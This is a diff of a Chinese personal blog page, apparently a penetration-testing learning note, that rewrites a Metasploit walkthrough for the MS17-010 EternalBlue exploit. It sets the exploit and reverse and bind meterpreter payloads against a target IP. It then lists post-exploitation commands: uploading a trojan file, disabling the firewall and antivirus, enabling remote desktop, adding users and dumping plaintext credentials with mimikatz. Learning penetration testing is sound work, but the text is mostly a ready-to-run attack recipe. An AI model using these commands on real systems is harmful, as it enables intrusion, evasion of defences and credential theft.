@@ -14,12 +14,10 @@
 <meta property="og:url" content="http://yoursite.com/2017/09/20/msf_17_010/index.html">
 <meta property="og:site_name" content="ESE">
 <meta property="og:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg">
-<meta property="og:updated_time" content="2017-09-20T10:21:20.443Z">
+<meta property="og:updated_time" content="2017-10-02T08:49:35.512Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MSF">
 <meta name="twitter:description" content="记录每天的进步，只有努力不会背叛自己！ MSF 使用ms17-010渗透测试">
-<meta name="twitter:image" content="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg">
   
   
     <link rel="icon" href="/favicon.png">
@@ -183,8 +181,10 @@
       
         <p>记录每天的进步，只有努力不会背叛自己！</p>
 <h1 id="MSF-使用ms17-010渗透测试"><a href="#MSF-使用ms17-010渗透测试" class="headerlink" title="MSF 使用ms17-010渗透测试"></a>MSF 使用ms17-010渗透测试</h1><a id="more"></a>
-<h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>运行smb模块探测主机445端口开放情况<br><code>use auxiliary/scanner/smb/smb_version</code><br>设置目标和运行线程<br><code>set rhosts 192.168.31.0/24</code><br><code>set threads 50</code><br>结果：<br><img src="http://ww2.sinaimg.cn/large/006rgqhqgy1fjq6coff4sj30ga04jdgu.jpg" alt=""><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br>命令查看刚才扫描结果<br><code>services -r tcp -p 445 -R</code></p>
-<h2 id="2、把扫描结果进行ms17-010漏洞检测"><a href="#2、把扫描结果进行ms17-010漏洞检测" class="headerlink" title="2、把扫描结果进行ms17-010漏洞检测"></a>2、把扫描结果进行ms17-010漏洞检测</h2><p>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.31.94</code><br><code>set lhost 192.168.31.115</code><br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>run运行</p>
+<h2 id="1、漏洞检测"><a href="#1、漏洞检测" class="headerlink" title="1、漏洞检测"></a>1、漏洞检测</h2><p>运行数据库<br><code>service postgresql start</code><br>启动msfconsole<br><code>msfconsole -q</code><br>使用smb_ms17_010模块探测MS17-010漏洞<br><code>use auxiliary/scanner/smb/smb_ms17_010</code><br><code>set rhosts 192.168.1.134</code></p>
+<h2 id="2、把扫描结果进行ms17-010漏洞检测"><a href="#2、把扫描结果进行ms17-010漏洞检测" class="headerlink" title="2、把扫描结果进行ms17-010漏洞检测"></a>2、把扫描结果进行ms17-010漏洞检测</h2><p>使用攻击模块<br><code>use exploit/windows/smb/ms17_010_eternalblue</code><br>option（or info）查看参数<br><code>set rhost 192.168.1.134</code><br>这需要路由器开放端口，才能返弹<br><code>set payload windows/x64/meterpreter/reverse_tcp</code><br>这直接绑定<br><code>set payload windows/x64/meterpreter/bind_tcp</code><br>run运行</p>
+<h2 id="3、meterpreter的基本命令"><a href="#3、meterpreter的基本命令" class="headerlink" title="3、meterpreter的基本命令"></a>3、meterpreter的基本命令</h2><p>1.getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录,getuid,getpid<br>2.upload命令：可以上传文件或文件夹到目标机器<br><code>upload /root/muma.py d:\\</code><br>3.download命令：从目标机器上下载文件夹或者文件到攻击机<br><code>download muma.py /root</code><br>4.search命令：支持对远程目标机器上的文件进行搜索<br>5.portfwd命令：这个是meterpreter内嵌的端口转发器,目标主机开放的远程桌面3389端口<br><code>portfwd add -l 3389 -r 10.21.13.225 -p 3389</code><br>这条命令也可以开启3389远程桌面<br><code>run post/windows/manage/enable_rdp</code><br>或<br><code>run getgui -e</code><br>6.ps命令可以用来获取目标主机上正在运行的进程信息<br>7.migrate命令，将当前meterpreter会话从一个进程移植到另外一个进程的内存空间中,如果该程序中断，meterpreter也会中断<br><code>migrate 10652(pid)</code><br>8.execute命令：可以在目标机中执行文件<br><code>execute -H -f cmd.exe</code><br>9.关闭目标机器的防火墙<br><code>netsh adcfirewall set allprofiles state off</code><br>10.添加用户<br><code>run getgui -u xxxxx -p xxxxx</code><br>11.关闭杀毒软件<br><code>run killav</code><br>12.屏幕截图<br><code>screenshot</code><br>13.shell进入windows命令行，exit()回到meterpreter<br>14.打开cmd命令行，看看已打开的端口<br><code>netstat -ano</code><br>15.测试是不是虚拟机<br><code>run post/windows/gather/checkvm</code><br>16.获取明文账号和密码<br><code>load mimikatz</code><br><code>kerberos</code><br><code>msv</code></p>
+<p>远程连接<br><code>mstsc</code></p>
 
       
 
